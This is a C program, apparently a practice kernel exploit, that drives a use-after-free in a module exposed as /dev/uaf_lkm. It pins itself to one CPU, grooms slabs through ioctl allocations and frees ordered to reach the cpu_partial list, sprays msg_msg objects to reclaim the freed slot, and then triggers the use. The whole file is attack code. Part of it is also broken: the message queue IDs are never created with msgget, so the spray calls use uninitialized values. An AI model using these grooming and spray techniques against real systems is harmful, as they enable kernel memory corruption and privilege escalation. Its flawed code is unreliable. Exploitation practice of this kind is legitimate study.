#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <linux/ioctl.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/ioctl.h>
#include <pty.h>

#define UAF_LKM_ALLOC _IO('F', 0)
#define UAF_LKM_FREE  _IO('F', 1)
#define UAF_LKM_USE   _IO('F', 2)


int main()
{
    int fd_uaf = 0;
    int cpu_partial = 24;
    int objs_per_slab = 16;
    int ret = 0;
    int cpu_partial_count = objs_per_slab * (cpu_partial + 1);
    int first_slab_count  = objs_per_slab - 1;
    int second_slab_count = objs_per_slab + 1;

    unsigned long flag = 0xdeadbeafdeadbeaf;

    int msgiq[2000];
    int cpu_partial_array[cpu_partial_count];
    int first_slab_array[first_slab_count];
    int second_slab_array[second_slab_count];

    char tmp_char;
    cpu_set_t core_alloc;
    cpu_set_t core_free;

    struct
    {
        long mtype;
        char mtext[976];
    } msg_spray;

    msg_spray.mtype = 1;

    memset(&msg_spray.mtext, 0xAA, 976);

    CPU_ZERO(&core_alloc);
    CPU_SET(0, &core_alloc);

    for (int i = 0; i < 2000; ++i)
    {
        msgsnd(msgiq[i], &msg_spray, sizeof(msg_spray.mtext), 0);
    }

    fd_uaf = open("/dev/uaf_lkm", O_RDONLY);

    sched_setaffinity(0, sizeof(core_alloc), &core_alloc);

    for (int i = 0; i < cpu_partial_count; ++i)
    {
        cpu_partial_array[i] = open("/dev/uaf_lkm", O_RDONLY);
        ioctl(cpu_partial_array[i], UAF_LKM_ALLOC, 0);
    }

    for (int i = 0; i < first_slab_count; ++i)
    {
        first_slab_array[i] = open("/dev/uaf_lkm", O_RDONLY);
        ioctl(first_slab_array[i], UAF_LKM_ALLOC, 0);
    }

    ioctl(fd_uaf, UAF_LKM_ALLOC, 0);

    for (int i = 0; i < second_slab_count; ++i)
    {
        second_slab_array[i] = open("/dev/uaf_lkm", O_RDONLY);
        ioctl(second_slab_array[i], UAF_LKM_ALLOC, 0);
    }

    ioctl(fd_uaf, UAF_LKM_FREE, 0);

    for (int i = 0; i < first_slab_count; ++i)
    {
        ioctl(first_slab_array[i], UAF_LKM_FREE, 0);
    }

    for (int i = 0; i < second_slab_count; ++i)
    {
        ioctl(second_slab_array[i], UAF_LKM_FREE, 0);
    }

    for (int i = 0; i < cpu_partial_count; ++i)
    {
        if (i % objs_per_slab == 0)
        {
            ioctl(cpu_partial_array[i], UAF_LKM_FREE, 0);
        }
    }

    for (int i = 0; i < 2000; ++i)
    {
        ret = msgsnd(msgiq[i], &msg_spray, sizeof(msg_spray.mtext), 0);
    }

    ret = ioctl(fd_uaf, UAF_LKM_USE, 0);
    printf("result ioctl -> %d \n", ret);

    for (int i = 0; i < 2000; ++i)
    {
        msgctl(msgiq[i], IPC_RMID, 0);
    }

    return 0;
}
